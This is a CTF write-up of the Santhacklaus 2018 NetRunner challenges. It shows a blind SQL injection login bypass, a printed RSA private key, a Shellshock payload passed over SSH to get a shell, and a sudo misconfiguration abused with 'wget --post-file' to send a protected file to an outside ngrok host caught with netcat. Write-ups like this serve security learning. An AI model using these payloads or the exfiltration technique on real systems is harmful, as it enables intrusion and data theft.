# [Santhacklaus 2018] - NetRunner


## NetRunner 1/3

### Statement


![](/lib/images/writeups/2018_santhacklaus/netrunner/statement_netrunner1.png)


### State of the art

Ok, we got a sexy website:


![](/lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_1.png)


A login form, we don't have to use scanner or something like that, I want to say "SQL injection".

After several tries, indeed, it's a full blind sql injection:


![](/lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_2.gif)


### Bypass
 
I could try to script something or use SQLMap to extract all the database. And it's probably that's what I would have done before SIGSEGv1 event.

I was near Geluchat during the CTF and he first blooded one of the hardest web challenge. He also explained me how he did. During his SQL injection he played with `LIMIT` SQL statement, let's try here:


![](/lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_3.gif)


### Flag

> IMTLD{w3b_1nT3rf4ceS_4r3_3v1L} 

## NetRunner 2/3



| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | NetRunner 2/3       | App-Script         |   750    | 18     |



### Statement


![](/lib/images/writeups/2018_santhacklaus/netrunner/statement_netrunner2.png)


### State of the art

At the end of the previous challenge we got the SSH private key of __puppet-master__ user:

```raw
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```

```bash
$ ssh -i /home/maki/Documents/chall/imtld/netrunnners/priv.key puppet-master@51.75.202.113 -p 2021   

.___..___.___..__..___..___ __ .  .
  _/ [__   |  [__]  |  [__ /  `|__|
./__.[___  |  |  |  |  [___\__.|  |


Do not use Zetatech maintenance interface if you are not authorized by Zetatech Corporation.


████████████████████████████ CONNECTION ESTABLISHED ████████████████████████████


----------------------------- General Informations -----------------------------

Software Version     ::: 10.5.2546_b1 [OBSOLETE]
Client ID            ::: 1534D 4245 97554 P

General health       ::: [ALIVE]

Management interface ::: [ONLINE]
Maintenance link     ::: [ONLINE]



----------------------- Installed Cybernetic Prosthetics -----------------------

Zetatech Neural Processor MK.II   ::: [CONNECTION ERROR]
Zetatech Enforcement 10.A Sidearm ::: [NOT CONNECTED]
Zetatech Binoculars BT.4          ::: [NOT CONNECTED]


Connection to 51.75.202.113 closed.
```

Ok, the server is printing the above message and immediatly close the ssh connection.

### Exploitation

In this challenge, you have to find a way to keep the session open. I first tried to use `-N` parameter of SSH, but it doesn't work.

So I asked to Google: http://lmgtfy.com/?q=ssh+immediate+disconnection+ctf

And finally found this writeup: https://securitybytes.io/vulnhub-com-tr0ll2-ctf-walkthrough-9993042f8af8

So, go on, I tried with a Shellshock payload:

```bash
$ ssh -i /home/maki/Documents/chall/imtld/netrunnners/priv.key puppet-master@51.75.202.113 -p 2021 '() { :;}; /bin/bash'

.___..___.___..__..___..___ __ .  .
  _/ [__   |  [__]  |  [__ /  `|__|
./__.[___  |  |  |  |  [___\__.|  |


Do not use Zetatech maintenance interface if you are not authorized by Zetatech Corporation.
ls
client.note
status.sh
tech.note
id
uid=1001(puppet-master) gid=1001(puppet-master) groups=1001(puppet-master)
```

It work! But before going further, I want to have a fully functionnal bash: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

```bash
# On remote server
$ which python3
/usr/bin/python3

$ python3 -c "import pty;pty.spawn('/bin/bash')"
puppet-master@2a87f3ade358:~$ # Do CTRL + Z to suspend to current job

# On localhost
localhost $ stty raw -echo 
localhost $ fg # It will not be display
localhost $ reset 
reset: unknown terminal type unknown
Terminal type? xterm

# On remote server
puppet-master@2a87f3ade358:~$ id
uid=1001(puppet-master) gid=1001(puppet-master) groups=1001(puppet-master)
```


![](/lib/images/writeups/2018_santhacklaus/netrunner/netrunner1_4.gif)


And now we got auto-completion, we can use CTRL + C, we can edit files with vim :D

```bash
puppet-master@2a87f3ade358:~$ cat client.note 

.___..___.___..__..___..___ __ .  .
  _/ [__   |  [__]  |  [__ /  `|__|
./__.[___  |  |  |  |  [___\__.|  |


:::: Client Note ::::

You can access to your web interface to have more informations.
You can use this maintenance interface anytime to check your Cybernetics Prosthetics status.
If you have any issues with Zetatech products, please contact us.

Note: the password is the same than your username.

:: IMTLD{Pr0t3ct_Y0uR_Gh0sT}
```

### Flag

> IMTLD{Pr0t3ct_Y0uR_Gh0sT}

## NetRunner 3/3



| Event        | Challenge      | Category      | Points | Solves     |
|--------------|----------------|---------------|--------|------------|
| Santhacklaus | NetRunner 3/3       | App-Script         |   450    | 18     |



### Statement


![](/lib/images/writeups/2018_santhacklaus/netrunner/statement_netrunner3.png)


### State of the art

At this point, the goal is pretty obvious: get privileged access. During a pentest there are some attack vectors:

* sudo misconfigured
* crontab or services running as privileged user
* suid binary or script to exploit

### Sudo misconfigured

Here, this is a misconfigured sudo:

```bash
$ sudo -l 
[sudo] password for puppet-master: puppet-master
Matching Defaults entries for puppet-master on 2a87f3ade358:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    lecture=never

User puppet-master may run the following commands on 2a87f3ade358:
    (puppet-master : zetatech-maintenance) /usr/bin/wget
```

Most of the time, the user can run a command as root without password. In this case, the vulnerability comes with the `zetatech-maintenance` group.

What could happen if we execute command with this group? We will getting group right :D

### Exploit

I don't have my VPS under my hand, then I will use `ngrok`, it allows us to open a port through their server and listen / send data on it: https://ngrok.com/

It works like that (picture from their official website):


![](https://ngrok.com/static/img/demo.png)


1. First localhost terminal:

```bash
$ ngrok tcp 1223
[...]
Web interface 
http://127.0.0.1:4040

Forwarding
tcp://0.tcp.ngrok.io:15462 -> localhost:1223        
[...]      
```

2. Second local host terminal

```bash
$ ping 0.tcp.ngrok.io                        
PING 0.tcp.ngrok.io (52.15.72.79) 56(84) bytes of data.
^C
--- 0.tcp.ngrok.io ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms

$ nc -lvp 1223       
Listening on [0.0.0.0] (family 0, port 1223)
```

3. On remote server terminal

```bash
puppet-master@2a87f3ade358:~$ sudo -g zetatech-maintenance wget --post-file /home/puppet-master/tech.not http://52.15.72.79:15462
```

And magic appears in our second localhost terminal:

```bash
$ nc -lvp 1223       
Listening on [0.0.0.0] (family 0, port 1223)
Connection from localhost 53726 received!
POST / HTTP/1.1
User-Agent: Wget/1.18 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 52.15.72.79:15462
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 266


.___..___.___..__..___..___ __ .  .
  _/ [__   |  [__]  |  [__ /  `|__|
./__.[___  |  |  |  |  [___\__.|  |


:::: Admin Note ::::

Branch the Zetatech Pad to Cybernetic Prosthetic client and use the following generated password.

:: IMTLD{Wh3r3_d03s_HuM4n1tY_3nd}
```

### Flag

> IMTLD{Wh3r3_d03s_HuM4n1tY_3nd}
